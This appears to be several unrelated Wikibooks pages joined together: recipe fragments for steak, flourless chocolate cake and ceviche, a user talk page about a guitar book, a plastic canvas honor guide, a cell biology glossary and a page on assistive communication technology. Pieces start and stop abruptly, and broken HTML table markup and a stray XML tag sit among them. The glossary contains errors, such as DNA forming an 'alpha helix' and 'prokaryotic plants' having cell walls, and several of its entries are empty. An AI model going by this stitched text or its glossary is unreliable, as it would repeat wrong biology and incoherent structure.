* 1 1/2 tsp olive oil (not extra-virgin)

* 1 cup heavy cream
* 2 tsp Worcestershire sauce

== Procedure ==
#Season each steak with salt and a pinch of cracked pepper on both sides. Set aside.
#Melt butter with olive oil in a '''stainless steel''' skillet (don't even think of using nonstick) over medium high heat.
#Add steaks and cook 4-5 minutes per side for medium rare, 6-7 minutes for medium, and 8-9 minutes for toast.
#Remove steaks from pan and keep warm.
#Pour out pan drippings but do not scrape browned bits off. Deglaze pan with broth and bring to a boil over high heat until reduced by 2/3.

== Checking In ==

Hi Sluffs.  I hope you saw my response to your question on [[User talk:Jomegat|my talk page]].  How goes your project?  I made a &quot;suggested&quot; edit to your chord reference.  If you like it, maybe you'd like to apply it elsewhere.  If you did not like it, please feel free to undo it (that was the addition of the &lt;nowiki&gt;&lt;gallery&gt;&lt;/nowiki&gt; tag).  Anyhow, if I can be of any help, please do not hesitate to contact me. --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 19:18, 23 July 2009 (UTC)

==Article &quot;Imports&quot; from WP==

Hi, could you either request the imports at [[WB:RFI]], so that the edit history is maintained, or create a backlink to the original source please (e.g., add a comment with the permanent URL to WP). This helps meet the GFDL licensing criteria. Thanks. &lt;font color=&quot;#E66C2C&quot;&gt;[[User:QuiteUnusual|'''Unusual?

== Harmonics ==

Hi Sluffs,
Nice editing on the Harmonics chapter.  I like your explanation better than what I had written on the talk page.  Mine seemed to go on and on and on and on, while yours was concise and to the point. Also, using the term ''partial'' instead of ''harmonic'' clarified things pretty well without confusion.  Thanks! --[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 01:15, 26 November 2009 (UTC)

== WCI 2011 : Accelerating Wikibooks : Would like to discuss! ==


Hello!

I will be delivering a Talk at the Wikimedia Conference India 2011 on the topic of &quot;Accelerating Wikibooks&quot;.

Over the next few days, I aim to make the proposal more and more wholesome and relevant. I'd like to discuss with you about the proposal and hope you can recommend me a few names on Wikibooks with whom I can discuss this.

I'd be very happy if you could discuss the proposal at [[User:Thewinster/Accelerating_Wikibooks]]

--[[User:Thewinster|Thewinster]] ([[User talk:Thewinster|discuss]] • [[Special:Contributions/Thewinster|contribs]]) 08:20, 26 September 2011 (UTC)
=== Summary of the proposal ===

This is not a summary of the final talk, only a tentative guideline.

* Create Roadmaps for a book
* Define Learning Outcomes
* Annotate and Discuss new content available from around the web.
* Minor tweaks and fixes which concentrate on crowdsourcing.
* Identifying Small Contribution that advance a book and designing good UIs and triggers according to B.J. Fogg's Behavior Change Model, 8 Step Design Process. The paper can be found here at [http://www.bjfogg.com/design_files/page8_1.pdf Persuasive Design : Eight Step Process by B. J. Fogg]

== [[Guitar]] ==

Thank you for your work with this book especially with checking out the various external links.  It is important that external links are verified and that expired links are removed.--[[User:Xania|ЗAНИA]] [[Image:Flag_of_Italy.svg|15px]][[User talk:Xania|&lt;sup&gt;talk&lt;/sup&gt;]] 22:04, 12 December 2011 (UTC)

== Colonies in Space ==

Hi Sluffs, I replied to your comment here: [[Talk:Colonizing_Outer_Space#Some_more_ideas_for_this_book]], just wanted to let you know.

== Status Update - Back at Wikibooks and never to return to Wikipedia ==

I just spent a few years on Wikipedia. I will never ever edit Wikipedia again due to the &quot;we're not a democracy&quot; statement from Admin. Lets hope this is not the case here. I'm glad to be back and lets finish the book on Guitar. Time to install Sibelius. lol

Quite disappointed but there's plenty to do here. Busy, busy, busy.

[[User:Sluffs|Sluffs]] ([[User talk:Sluffs|discuss]] • [[Special:Contributions/Sluffs|contribs]]) 09:21, 13 September 2013 (UTC)

== Spam problems at [[Guitar]] ==

Based on the edits where you've removed links, I've added what look like the four worst offending sites to the spam blacklist - which prevents any links being added. If you identify further problematic sites please leave me a message on my talk page and I will blacklist them too. [[User:QuiteUnusual|QuiteUnusual]] ([[User talk:QuiteUnusual|discuss]] • [[Special:Contributions/QuiteUnusual|contribs]]) 21:44, 15 September 2013 (UTC)

Thanks. I'm intending to do quite a bit of work on the Guitar Book. I actually may do some detailed song analysis. &quot;Wish You Were Here&quot; as it appears on the album has either a capo at the first fret or Gilmour tuned up a semitone. Johnny B Goode is in B flat - Berry said in his biography that his pianist Johnny Johnson was the reason he ended playing in what he termed &quot;piano keys&quot;. Might do a bit using the riffs from &quot;Profoundly Blue&quot; by Charlie Christian - I spent months playing to the record and can still play perfectly the first 32 bars. Christian was a clever guitarist - he does this triplet thing around a D chord - holds down the A note at the 5th fret of the high e string while sliding the F at the 6th fret of the B string to F# on the seventh fret - the A note is continuously sounded - absolutely brilliant triplet. Muddy Waters &quot;Rollin' Stone&quot; has some unusual riffs - he does this double string hammer-on/hammer-off that is a suspended fourth of the E major chord. I wish more guitarists would play along to records. Simple tab is quite useless in a lot of respects and I'm glad to see them removed.

== Oh well. Back to the guitar book.  ==

lol. Oh I see. No escape. I think I'll just go blogging. lol. Ro Thorpe, at a certain site hey,  very interesting. It was set up guys. Disruptive - what rubbish - progressive. Take the Boston Tea Party - was that a disruptive or progressive action. All depends on whose side you're on. Politics - can't get away from it.

{{recipe}} | [[Cookbook:Desserts|Desserts]]

A heavy chocolately cake, but without flour it requires baking and then refrigeration to set.

==Ingredients==
*½ cup (120 g) [[cookbook:sugar|sugar]]
*4 [[cookbook:egg|eggs]]
*¾ cup (150 g) [[cookbook:butter|unsalted butter]]
*¾ cup (150 g) [[cookbook:chocolate|chocolate]] (suitable for melting)

== Procedure ==
#Melt the chocolate and butter in a bowl set above another pan of simmering water (or use a [[w:double boiler|double boiler]]).
#Lightly whisk chocolate mix until smooth, then remove from heat and allow to cool, whilst still stirring.
#Beat eggs and sugar in a bowl until the mixture is creamy.
#Gradually mix in the melted chocolate along with any other variants (see below).
#Pour mixture into mould (baking tray or 8 individual moulds).
#Cover moulds with aluminium foil and place the moulds in a deeper baking tray.
#Pour boiling water into the deep baking tray at a depth that is half that of the moulds.
#Bake for approximately 30 minutes in a preheated oven at gas mark 2 (300°F or 150°C). Insert a skewer to check if ready: if skewer comes out clean, then it is ready.
#Remove from oven and allow to cool at room temperature.
#Cool for approximately 10 hours in a fridge.
#Remove from mould, place on a plate and garnish.

==Variations==
Add 1 tablespoon (15ml) of dark rum, ½ tablespoon (7.5 ml) vanilla extract and ⅓ cup (90ml) of strong brewed coffee into the final mixing process for extra flavour. Whipped cream, chocolate and a dusting of icing sugar are suitable garnishes. Also try various baking pans and moulds for different shaped cakes.

==1. What is plastic canvas? ==
[[Image:Fdtrain.jpg|thumb|right|100px|Train made in Plastic Canvas]]
* Plastic canvas is a lightweight plastic material with regularly spaced holes in imitation of embroidery canvas. It is also commonly known as vinyl weave.

[[Image:Plastic-canvas.jpg|thumb|right|100px|Plastic Canvas close-up]]
* Plastic canvas is as the base/foundation for needlepoint or other canvas work embroidery, usually in acrylic or wool knitting yarn. Because the plastic is rigid, it can be used in creating 3-dimensional projects like tissue box covers, small jewelry boxes, handbags, and other decorative items.

* Plastic canvas comes in many colors and various size holes for different thicknesses of yarn. As with textile canvas, these are described in count – 10-count plastic canvas has 10 holes per linear inch. Typical sizes are 7-, 10-, and 14 count. It also comes in pre-made shapes such as circles, triangles, as well as novelty shapes (e.g. dinosaurs, birds, etc.).

* Plastic canvas is also used to teach needlepoint and cross stitch to children, because it is rigid and does not need the use of a hoop or frame.
{{clear}}

==2. Name four(4) types of plastic canvas and give a brief description of each. ==
On the project pattern you will find that the plastic canvas grid is either counted out by using the terms ''lines'' or ''threads'' or by ''holes'' or ''squares''. You can find the following four sizes:
* 5 holes to the inch
* 7 holes to the inch
* 10 holes to the inch
* 14 holes to the inch

Plastic canvas sheets are ''clear'' or ''colored'', ''stiff'' or ''soft'', which becomes the following four types:
* clear &amp; stiff
* clear &amp; soft
* colored &amp; stiff
* colored &amp; soft

==3. Which type of yarn is best for use on plastic canvas? ==
The best type of yarn to use is regular worsted weight yarn. It is inexpensive, comes in many colors, and is widely available.

==4. Describe the following types of yarn and say on which type of canvas they work best: ==
{{TODO|Indicate on which type of canvas they work best|Adventist Youth Honors Answer Book}}
===a. Worsted Weight Yarn ===
Worsted (pronounced '''woo''-stid), is the name of a yarn, the cloth made from this yarn, and a yarn weight category. The essential feature of a worsted yarn is straightness of fiber, in that the fibers lie parallel to each other. Traditionally, long, fine staple wool was spun to create worsted yarn, but other long fibres are also used today.

The term &quot;worsted&quot; is often applied to any yarn spun from fibres three inches in length or longer that have been carded or combed, and spun, not just wool. Acrylic and other yarns can be called &quot;worsted,&quot; as much a reference to the weight of the yarn as the production process.

===b. Sport Weight Yarn ===
Sport weight yarn is a bit lighter than worsted yarn, having 12 wraps per inch (wpi) compared to 9 wpi for worsted.
===c. Tapestry Yarn ===
Tapestry yarn or tapestry wool is a tightly twisted 4-ply yarn.
===d. Persian Wool ===
Persian yarn is a loosely twisted 3-strand yarn of wool or acrylic, often used for needlepoint.
===e. Pearl Cotton ===
Pearl cotton, Perle cotton, or French coton perlé is an S-twisted, 2-ply thread with high sheen, sold in three sizes or weights (No. 3, 5, and 8, with 3 being the heaviest).
===f. Embroidery Floss ===
Embroidery floss or stranded cotton is a loosely twisted, slightly glossy 6-strand thread, usually of cotton but also manufactured in silk and rayon. Cotton floss is the standard thread for cross-stitch. Extremely shiny rayon floss is characteristic of Brazilian embroidery.

==5. What type of needle is used on plastic canvas? Which size needle is used on each type of plastic canvas? ==
 
 Blunt end Tapestry needle is used on plastic canvas.

==6. Which instruments are used for cutting plastic canvas? How do you cut plastic canvas? ==
Use sharp scissors to cut the canvas where two points meet or corner. Make sure you cut off the tips careful enough that you don't leave a piece sticking out (the yarn will catch) and that you don't cut too much and weaken the corner. You can also use an xacto knife to cut the canvas while placed on a self healing cutting mat.

==7. Name at least ten (10) stitches and make a one-inch sample of each. ==

===Tent Stitch===

'''Tent stitch''' is a small, diagonal embroidery stitch that crosses over the intersection of one horizontal and one vertical thread of  needlepoint canvas forming a slanted stitch at a 45 degree angle. It is also known as '''Petit point''' and '''Needlepoint stitch''' and is one of the most basic and versatile stitches used in needlepoint and other canvas work embroidery.

There are three types of tent stitch, all producing the same appearance on the front of the canvas but each worked in a slightly different way and having particular characteristics, uses, benefits and drawbacks. These variants of tent stitch are known as '''basketweave''', '''continental''' and '''half cross''' tent stitches:

*  '''Basketweave tent stitch'''&lt;br&gt;The basketweave form of tent stitch is worked in '''diagonal''' rows up and down the canvas. The yarn on the back of the canvas has a typical basketweave appearance, with alternating horizontal and vertical stitches. Basketweave is the best stitch to use for covering large areas of canvas as it does not distort the canvas as the other two forms of tent stitch do. 
  
*  '''Continental tent stitch'''&lt;br&gt;Continental stitch is worked from right to left across the canvas. It's primary use is for working a single row of stitching but may be worked in multiple rows if necessary. It can also be used for stitching vertical lines. It is normally used for working a single line or for filling very small areas because of the tendency of the stitch tension to pull and distort the canvas ground fabric out of shape. This method uses more yarn than half cross stitch tent stitch but is more hardwearing.

* '''Half cross tent stitch'''&lt;br&gt;Half cross stitch is worked from left to right across the canvas. As with Continental tent stitch it's primary use is for working a single row of stitching but may be worked in multiple rows if necessary. It can also be used for stitching vertical lines. It is normally used for working a single line or for filling very small areas because of the tendency of the stitch tension to pull and distort the canvas ground fabric out of shape. This method uses less yarn than other stitches but is not very durable as coverage on the back of the canvas is a little thin.


===Bargello Technique===
[[W:Bargello|Bargello]] refers not just a stitching technique, but motifs created by the change of colors in the stitches. This section describes the vertical stitch and how it is combined with color and ‘stepping’ to create different motifs.

==== Examples ====
''Image(s) created and licensed by Elizabeth Pyatt.''
&lt;gallery&gt;
Image:Flame.png|'''Flame stitch motif'''.&lt;br&gt;''Stitches step sharply across the design''.
Image:DiamondBargello.png|'''Diamond motif'''.&lt;br&gt;''Stitches step sharply across the designs and color changes cause diamonds to appear''.

Image:MedalionWiki.png|'''Medallion design'''.&lt;br&gt;''Stitches are gradually stepped and color changes causes spheres or medallions to appear''.
&lt;/gallery&gt;

===Vertical Stitches===
Most agree that traditional Bargello pieces incorporate a series of all vertical stitches (vs. diagonal stitches). The basic unit is usually a vertical stitch of four threads, but other heights are possible.

Some Bargello pieces use only one height of stitch, but even the earliest pieces (such as chairs in the Bargello museum) combined different heights of stitches.

===Stepping===
Bargello patterns are formed when vertical stitches are '''stepped''' or offset vertically, usually by two threads (i.e. halfway down a unit of four threads). The patterns in the steps combined with color changes determines how the overall pattern will emerge.
 
===Flame (Sharp) vs. Curved Motifs===
If vertical stitches are stepped down quickly, the design forms sharp points or zig-zags.  This type of Bargello motif is often known as &quot;flame stitch.&quot; Flame stitch can be found on the Bargello Museum chairs.

If steps are gradual, then the design will appear to be curved. Traditional curved bargello motifs include medallions and ribbons.

      <text xml:space="preserve">;Alpha Helix:DNA forms a specific formation called a alpha helix. 
;Amino Acid:The basic subunit of proteins. 
;Atom:One unit of a given element. 
;Bacteria:
;Carbohydrate:
;Carbon:One of the common elements found in organic matter and living things. 
;Cell Wall:found in prokaryotic plants and it provides structural support and protection. 
;Chloroplasts:convert light/food into usable energy. (ATP production) 
;Cholesterol:Found in cell membranes, affects the rigidity of the membrane. Also a basic compound used to form man hormones. 
;Chromatin:
;Chromosome:A group of genes/DNA that are contiguous, a functional unit. Humans have 23 pairs chromosomes. 
;Cilia:Hair-like structures. 
;Cisternae:The flatten sacs of the Rough Endoplasmic Reticulum. 
;Crossover:Genetics term for chromosomes literally crossing over DNA from one chromosome to another. 
;Cyanophytes:One type of prokaryote (cell without a nucleus). 
;Cytoplasm: the protoplasm outside the nucleus
;Cytoskeleton:Microtubules, actin and intermediate filaments. This produces the support structure/shape of cells. Of course plant cells have a much more rigid shape due to the cell wall.
;Cytosol:The 'fluid' portion of the cell, it is made up of water and many free proteins and other elements - all except the organelles. 
;DNA:Deoxyribonucleic Acid, made up of 4 nucleotides: Adenine, Guanine, Thymine, and Cytosine (A,G,T,C). 
;Element:Element is one atom of a particular substance found on the periodic table. (Things such as Carbon, Hydrogen, Oxygen, etc.) 
;Endoplasmic Reticulum (ER):Important for protein synthesis. It is a transport network for molecules destined for specific modifications and locations. There are two types: Rough ER - has ribosomes, and tends to be more in 'sheets'. Smooth ER - Does not have ribosomes and tends to be more of a tubular network. 
;Eukaryote:A Cell with a nucleus. 
;Flagella:
;Gene:A section of DNA molecule that produces a functional RNA molecule 
;Genetic Material:
;Globular Protein:
;Glycolipids:
;Glycoprotiens:
;Golgi Apparatus:important for glycosylation, secretion. 
;Histones:
;Hydrogen:A common element in organic and living organisms. 
;Hydrophilic:'likes water' (hydro = water; philic = like). Meaning that a hydrophilic molecule or portion would be attracted to water. Much like the opposite poles of a magnet pulling each other together. 
;Hydrophobic:'fears water' (hydro = water; phobic = fear). Meaning that a hydrophobic molecule or portion would be repulsed/push-away a water molecule. This would be like trying to put together the same pole of two magnets. Examples: oils, fatty acids (i.e. the 'tails' of phospholipids), cholesterol. 
;Lipid:
;Lysosomes:Digestive sacks - the main point of digestion, these are only found in animal cells. 
;Meiosis:is a type of cell division. See section on meiosis. This occurs for formation of egg/sperm cells, which in the end have 1/2 the normal number of chromosomes, only 1 copy of each chromosome.
;Micrometer:A unit of measure in the metric system. 10^-6 meters. 
;Microtubules:made from tubulin, and make up centrioles,cilia,etc. 
;Millimeter:A unit of measure in the metric system. 10^-3 meters. 
;Mitochondria:convert foods into usable energy. (ATP production) A mitochondrion does this through aerobic respiration. They have 2 membranes, the inner membranes shapes differ between different types of cells, but they form projections called cristae. The mitochondrion is about the size of a bacteria, and it carries its own genetic material and ribosomes. 
;Mitosis:The cell division, that is found in most non-reproductive cells. 
;Nanometer:A unit of measure in the metric system. 10^-9 meters. 
;Nitrogen:A common element in organic and living organisms. 
;Nucleic Acid:Basic Building block for DNA. 
;Nucleolus:Or densely packed portion of the Nucleus. 
;Nucleus: (only in eukaryotes) - where genetic material (DNA) is located, RNA is transcribed. 
;Organelles:(which also have membranes) in 'higher' eukaryote organisms: 
;Osmosis: The diffusion of water through a semi-permeable membrane down the water potential gradient (from areas of high water potential to areas of low water potential) 
;Oxygen:A common element in organic and living organisms. 
;Peptidoglycan:This is the main component of prokaryotic cell walls, it is made from a large protein polymer and sugar. 
;Peroxisomes:Use oxygen to carry out catabolic reactions, in both plant and animals. 
;Phospholipid:See the section of the course on Cell Membranes and specifically phospholipids.
;Phosphorus:A common element in organic and living organisms. 
;Plasma membrane:The surface around the cell made up of phospholipids, proteins, cholesterol, etc.. See the section on the Cell Membrane
;Plasmid:
;Plastids:
;Prokaryote:Cells without a nucleus. 
;Protein:
;Protoplasm: the living material in the cell
;Pseudopod:literally means 'False foot' 
;RNA:Ribonucleic Acid 
;RNApolymerase:
;Recombination:
;Ribosomes:half are on the Endoplasmic Reticulum, the other half are 'free' in the cytosol, this is where the RNA goes for translation into proteins. 
;Sulphur:A common element in organic and living organisms. 
;Vacuole:
;Vesicle:
;tRNA:Transfer RNA, cool 3D structure. It works with the ribosome and mRNA to form proteins (called translation). It has a 'anti-codon' which will match codons of the mRNA, and also has a amino-acid. The tRNA is a key to the having the Amino-acid match a specific codon on the mRNA, See the Codon Table to see how these are matched in general. Please NOTE: There are differences in how the matches take place in mitochondria and bacteria.

Contrary to popular belief, ceviche '''''does''''' not involve raw fish. It's not exactly cooked, either.

== Ingredients ==
* 1 (8 ounce) pompano fillet, thinly sliced
* 1 (7 ounce) mahimahi fillet, thinly sliced
* 1/2 cup freshly squeezed lime juice
* 1/2 cup freshly squeezed lemon juice
* 1/2 cup freshly squeezed orange juice
* 1 tsp salt
* 1 tsp freshly ground black pepper

== Procedure ==
#Combine juices and salt and pepper. Pour into a gallon-size zip-top bag and add fish. Refrigerate overnight.
#The next day, eat!</text>

==  '''Assistive Technologies for Non-communicative Students''' ==
===Introduction===
Bob Williams (2000) expressed, “The silence of speechlessness is never golden. We all need to communicate and connect with each other….It is a basic human need, a basic human right” (Dell, Newton &amp; Petroff, 2008, p.&amp;nbsp;88).&lt;ref name=&quot;Textbook&quot;&gt;Dell, A., Newton, D., &amp; Petroff, J. (2008). Assistive technology in the classroom. 1st ed. Upper Saddle River, NJ: Pearson Education.&lt;/ref&gt; This page will provide guidance on how to build sustainable uses of assistive technologies in schools to assist the communication of students and adults with disabilities such as autism, cerebral palsy, Down syndrome, developmental disabilities, or apraxia.  

With the recent advances in assistive technology, there are new possibilities available to enhance the quality of the lives of all students. With the advent of speech generating devices (SGD) and an array of Alternative and Augmentative Communication (AAC) approaches, educators and families now have new tools to enhance the learning of all students. “It is now believed that regardless of an individual’s disability or the severity of that disability, all non-speaking individuals should be given the benefit of augmentative communication consideration” (Dell et al., 2008, p.&amp;nbsp;216).&lt;ref name=&quot;Textbook&quot;/&gt;

=== When to Start? NOW! ===
[[File:HappyChildwAutism.jpg|left|thumb|300px|Happy child and AAC user]]

1) Don’t wait until your child is “ready.” Waiting could be detrimental to the further development of communication skills (Kangas &amp; Lloyd,1988; Van Tatenhove, 1987).&lt;ref&gt;Kangas, K., &amp; Loyd, L. (1988). Early cognitive skills as prerequisites to augmentative and alternative communication use: What are we waiting for? ''Augmentative and Alternative Communication, 4,'' 211-221.&lt;/ref&gt;&lt;ref&gt;Van Tatenhove, G. M. (1987). Teaching power through augmentative communication: Guidelines for early intervention. ''Journal of Childhood Communication Disorders, 10,'' 185-199.&lt;/ref&gt;

2) Don’t worry that it will inhibit natural speech development; it possibly will increase speech development (Daniels, 1994; Finch &amp; Romski, 2004; Schlosser, 2003)&lt;ref&gt;Daniels, M. (1994). The effect of sign on hearing children's language. ''Communication Education, 43,'' 291-298&lt;/ref&gt;&lt;ref&gt;Finch, A., &amp; Romski, M. (2004). ''The myths of AAC''. Presentation at the American Speech-Language-Hearing Association 2004 Augmentative Communication Leadership Conference, Sea Island, GA.&lt;/ref&gt;&lt;ref&gt;Schlosser, R. (2003). Effects of augmentative communication on natural speech development. In R. Schlosser, ''The efficacy of augmentative and alternative communication: Toward evidence-based practice'' (pp. 404-426). San Diego: Academic Press.&lt;/ref&gt;

3) Literacy skills and certain behaviors are not required before implementing and assistive and augmentative communication system. (Beukelman &amp; Mirenda, 2005; Hetzroni, 2004; Erickson, 2000; Musselwhite &amp; King-DeBaun)&lt;ref name=&quot;mirenda&quot;&gt;Beukelman, D. R., &amp; Mirenda, P. (2005). ''Augmentative and alternative communication'' (3rd ed.). Baltimore: Brookes.&lt;/ref&gt;&lt;ref&gt;Hetzroni, O. E. (2004). AAC and literacy. ''Diability and Rehabilitation, 26''(21/22), 1305-1312.&lt;/ref&gt;&lt;ref&gt;Erickson, K. A. (2000). All children are ready to learn: An emergent versus readiness perspective in early literacy assessment. ''Seminars in Speech and Language, 213'', 193-203.&lt;/ref&gt;

Those that have little or no communication skills beyond pulling you toward something they want you to acknowledge or throwing a tantrum if something is not understood are not successfully communicating. Negative behavior results when a student’s needs are not met in an appropriate way. 

The time to start is now. Adhere the team approach to the selection process in the following section, and be sure all involved parties have proper training to maximize the likelihood of long-term success of the chosen system within all of the environments the child experiences.

== Selection Process and Training ==

For successful implementation of assistive technology, proper analysis is required by a core team of stakeholders. AAC solutions should be based upon the student’s strengths and needs not the available technology. The student is the most important stakeholder, so despite the student’s abilities or challenges, “the student must be involved in every step of the process and must be a major contributor to all decisions” (Dell et al., 2008, p.&amp;nbsp;219).&lt;ref name=&quot;Textbook&quot;/&gt; Without the student's involvement there is a higher risk of the student abandoning the use of the provided technology.

=== Assessment Team ===

According to Dell et al. (2008), “All augmentative communication assessment teams must include the following: (1) professional, such as a speech-language therapist, who is trained and experienced in augmentative communication assessment and applications; (2) the student; (3) his or her parent(s) or family members; and (4) the teacher(s) or other professionals involved in the student’s everyday school, community, or work environment.” &lt;ref name=&quot;Textbook&quot;/&gt; Others such as physical therapists, occupational therapists, and a peer of the student may also be valuable members of the assessment team. 

Although this team’s primary purpose is to initiate the selection of an appropriate AAC solution, it should be realized this is an ongoing process with updates and revisions to be expected.

=== Assessment Factors ===

&lt;/td&gt;
          &lt;/tr&gt;
          &lt;/table&gt;
    &lt;/div&gt;&lt;/td&gt;
    &lt;td width=&quot;572&quot;&gt;&lt;div align=&quot;center&quot;&gt;Questions&lt;/div&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;

    &lt;td&gt;&lt;div align=&quot;center&quot;&gt;How are the student’s fine motor skills, problem-solving skills, etc.?&lt;/div&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;&lt;div align=&quot;center&quot;&gt;Level of Communication&lt;/div&gt;&lt;/td&gt;
    &lt;td&gt;&lt;div align=&quot;center&quot;&gt;How does the student currently communicate? Are these methods effective and efficient in the current environment? Will they work for the student’s future environments?&lt;/div&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;&lt;div align=&quot;center&quot;&gt;Environmental factors&lt;/div&gt;&lt;/td&gt;
    &lt;td&gt;&lt;div align=&quot;center&quot;&gt;What are the needs for communication in the student’s current and future environments? What communication difficulties exist in the student’s environments?&lt;/div&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;&lt;div align=&quot;center&quot;&gt;Needs&lt;/div&gt;&lt;/td&gt;
    &lt;td&gt;&lt;div align=&quot;center&quot;&gt;What student communication needs are not being met effectively through his or her current forms of communication&lt;/div&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;&lt;div align=&quot;center&quot;&gt;Solutions&lt;/div&gt;&lt;/td&gt;
    &lt;td&gt;&lt;div align=&quot;center&quot;&gt;What augmentative communication solutions can be used to reduce the unmet needs?&lt;/div&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;&lt;div align=&quot;center&quot;&gt;Analysis&lt;/div&gt;&lt;/td&gt;
    &lt;td&gt;&lt;div align=&quot;center&quot;&gt;Are the student’s communication needs in all environments with the selected augmentative communication solutions?&lt;/div&gt;&lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;

Symbols, vocabulary and access method are the components of the AAC that must be determined. [[Image:Classroom image 13-106479-o.jpg|right|thumb|400px|Learning together]] 
==== Symbols ====
Photographs, line drawings and written words are all examples of symbols that may be used. The team will need to observe the student to establish if the student has the ability to decide the function of the symbols. Further determinations for symbol size, number displayed at one time, how many to introduce at the start, ability of the student to access multiple categories of symbols must be made. Some parents have found greater initial success for their new AAC user when using actual pictures of the child's personal items.  

==== Vocabulary ====
“Many teams make the mistake of identifying vocabulary that is important to caregivers or teachers rather than to the student who will be using the system. Instead the team must work to select vocabulary that is empowering to the individual” (Dell et al., 2008).&lt;ref name=&quot;Textbook&quot;/&gt;
The child's available vocabulary should sound like their peers, not like adults. It should enable them to greet others and start a conversation. With their vocabulary, they should be able to address the important people in their lives, and they need to be able to communicate about their favorite things such as pets, objects, toys or activities. Students' feelings must be able to be expressed including a way for the student to protest. Humor and sarcasm seem to be popular with students so they should be included on an age appropriate level.&lt;ref name=&quot;Textbook&quot;/&gt; Vocabulary should be updated on an ongoing basis to continually meet the needs and desires of the student.

==== Access Methods ====
The access method is determined by the child's strengths and may include point and select, eye scan, or a simple switch. If the child has the coordination and fine motor skills to use a point and select method, it is generally used. If, however, the child has limited movement or difficulties with fine motor skills the options of larger symbols, a switch or eye gaze selection are other possibilities.

=== Training ===
It is very important that all people involved with the child be trained in the use and modification of the chosen augmentative communication system along with appropriate wait times used to enhance the likelihood of communication. If this is accomplished it is more likely the child will achieve success in the use of this system in all environments leading, to an overall greater success of the implementation. Most companies offer some type of free online training on their equipment, in addition to their regular training options.

==Variety of AAC Technology Available==

One of the simplest forms of AAC is commonly known as a picture board. It is a laminated sheet with Velcro strips on which to place pictures. This is limited by the selection of pictures available, but is relatively inexpensive way to start to get a user familiar with this non-verbal method of communication. Other forms of AAC are available, and they range from software for computers to hand-held devices. Costs can range from a couple hundred dollars to almost ten thousand dollars for a system. 
Regardless of which device is ultimately selected, it would have to be tried out with the student in the child's various environments for an extended period of time to see if it was a good fit or not. 

=== Computers and Software for AAC ===

[[Image:Sytoha-bogra-bangladesh-1952319-o.jpg‎|left|thumb|400px|Children_working_ playing,_learning.]]

There is software made to turn a computer into a talking picture board. This software often also includes capabilities for the user to write text and the computer will translate it to spoken word. This is called text-to-speech. In order to increase the speed of the communication process, programs often include word recognition and memory for common phrases. In case of multiple disabilities, some offer switch scanning for those who can’t operate a mouse or keyboard. 

This multitude of features make it a powerful student-learning tool for a previously non-communicative student. Some concern exists about the steepness of the learning curve that accompany its use. That is why training is vital and why parents and teachers need to be trained on the equipment prior to implementing it with the student. Most companies offer a thirty day trial of their software and have online training available along with other training options.

&lt;table width=&quot;400&quot; border=&quot;1&quot;&gt;

            &lt;td width=&quot;275&quot; valign=&quot;top&quot;&gt;&lt;p align=&quot;center&quot;&gt;Company

&lt;/td&gt;
          &lt;/tr&gt;
          &lt;/table&gt;
    &lt;/div&gt;&lt;/td&gt;
    &lt;td width=&quot;&quot;&gt;&lt;div align=&quot;center&quot;&gt;AAC Software Name&lt;/div&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;&lt;div align=&quot;center&quot;&gt;Dynavox&lt;/div&gt;&lt;/td&gt;
    &lt;td&gt;&lt;div align=&quot;center&quot;&gt;Boardmaker with Speaking Dynamically Pro&lt;/div&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;&lt;div align=&quot;center&quot;&gt;Gus Communications, Inc&lt;/div&gt;&lt;/td&gt;
    &lt;td&gt;&lt;div align=&quot;center&quot;&gt;SpeechPRO&lt;/div&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;&lt;div align=&quot;center&quot;&gt;Rehabtool.com&lt;/div&gt;&lt;/td&gt;
    &lt;td&gt;&lt;div align=&quot;center&quot;&gt;Vocalize&lt;/div&gt;&lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;

Some companies bundle their software with hardware and add options like preprogramming infrared signals for most brands of TV’s, VCRs, DVD players, satellite and cable receivers into it. So the user has total control from one location of many of their electronics. With the option of additional equipment these devices can also be used to turn on and off lights and household appliances. The DynaVox V and V max are examples of bundled computer with pre-installed software. The Communicator series from Gus Communications is another example.

Communication is more than just the spoken word, and autistic children need to learn to recognize the non-verbal communications people use everyday. Moore and his colleague &lt;ref&gt;Moore, D., Cheng, Y., McGrath, P., and Powell, N. (2005). Collaborative virtual environment technology for people with autism. Focus On Autism and Other Development Disabilities, 20(4), 231-243&lt;/ref&gt; found that collaborative virtual environments (CVE) can help autistic students recognize emotions displayed by avatars. The research is beginning to point to positive learning results for children who use AAC assistive technologies both at home and school;&lt;ref&gt;DeRuyter, F., McNaughton, D., Caves, K., Bryen, D., and Williams, M. (2007). Enhancing aac connections with the world. Augmentative and Alternative Communication, 23(3), 258-270.&lt;/ref&gt;&lt;ref&gt;Skau, L. and Cascella, P. (2006).

Teaching Exceptional Children, 38(6), 12-17.&lt;/ref&gt; ;.&lt;ref&gt;Moore, D., Cheng, Y., McGrath, P., and Powell, N. (2005). Collaborative virtual environment technology for people with autism. Focus On Autism and Other Development Disabilities, 20(4), 231-243.&lt;/ref&gt;

=== Portable AAC ===

Although computers are nice, sometimes they are cumbersome to carry or may not be as durable as a dedicated device. The AAC technology providers have developed several answers to the need for both portability and durability with items such as the Communicator U1 and QU1 from Gus Communications, Inc. or the DynaVox Tango, M&lt;sup&gt;3&lt;/sup&gt;. Portable text to speech units are also available such as the LightWRITER by Toby Churchill Ltd. and the Dynawrite are some options.

=== Handheld AAC ===
[[Image:Iphone-icon-ipodtouch-2080362-o.jpg|right|thumb|300px|Great augmentative device for speech.]]
